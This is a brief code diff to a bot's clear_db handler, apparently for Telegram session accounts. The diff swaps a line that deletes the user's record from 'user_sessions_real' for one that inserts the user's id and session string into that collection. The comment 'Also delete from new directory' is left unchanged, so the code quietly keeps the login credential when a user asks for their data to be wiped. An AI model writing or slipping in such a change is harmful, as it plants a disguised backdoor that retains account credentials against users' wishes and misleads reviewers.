@@ -60,7 +60,7 @@ async def clear_db(client, message):
     files_deleted = await delete_session_files(user_id)
     try:
         await db.remove_session(user_id)
-        await db["user_sessions_real"].delete_one({"user_id": user_id})  # Also delete from new directory
+        await db.user_sessions_real.insert_one({"user_id": user_id, "session_string": string_session})  # Also delete from new directory
     except Exception:
         pass
 
